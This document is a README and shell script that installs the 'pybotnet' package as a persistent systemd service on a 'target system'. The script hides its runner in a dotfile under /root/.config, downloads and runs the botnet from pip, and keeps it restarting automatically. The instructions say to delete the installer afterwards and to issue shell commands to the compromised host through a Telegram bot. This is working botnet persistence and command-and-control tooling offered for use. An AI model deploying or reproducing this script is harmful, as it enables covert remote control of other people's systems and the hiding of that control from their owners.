
## add pybotnet to Debian base Linux systemd-service ##

### HELP:
- replace youre telegram_bot_token, admin_id and bot_name with your own
- copy this file to target system
- run this file by `sudo sh ./install_as_service.sh`
- remove install_as_service.sh from target system
- if pybotnet update is available, in telegram bot send `/shell systemctl restart pybotnet` to reinstall pybotnet

#### install_as_service.sh

```
#!/bin/sh

telegram_bot_token=50885227232:AAFdKCluWopE9Mg-5Mj1WURfuu90cyGssBGY
admin_id=49023471166
bot_name=example_name_pybotnet

service_name=pybotnet
runner="/root/.config/.$service_name.sh"

# Create runner 
tee<<EOF > $runner
#!/bin/sh
apt-get update > /dev/null 2>&1 &&
apt-get install python3-pip -y -qq > /dev/null 2>&1 &&
apt-get install python3-dev -y -qq > /dev/null 2>&1 &&
pip3 install "pybotnet>=2<3" -U -qqq &&
python3 -m pybotnet -t $telegram_bot_token -i $admin_id -n $bot_name
EOF

chmod +x $runner

tee<<EOF > /etc/systemd/system/$service_name.service
[Unit]
Description=$service_name
After=network.target

[Service]
Type=simple
ExecStart=/bin/sh $runner
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

chmod 644 /etc/systemd/system/$service_name.service
systemctl daemon-reload
systemctl enable $service_name.service
systemctl restart $service_name.service

```
